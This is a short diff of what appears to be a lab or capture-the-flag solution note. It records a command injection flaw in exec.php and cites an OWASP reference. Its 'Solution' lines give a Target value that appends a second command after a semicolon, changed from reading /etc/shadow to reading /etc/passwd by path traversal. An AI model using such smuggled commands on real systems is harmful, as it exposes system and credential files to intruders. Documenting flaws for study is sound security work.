@@ -4,4 +4,4 @@ Flaw Location: exec.php
 Reference: https://owasp.org/www-community/attacks/Command_Injection
 
 Solution:
-Target* = 127.0.0.1;cat /etc/shadow
+Target* = 127.0.0.1;cat ../../../../../../etc/passwd
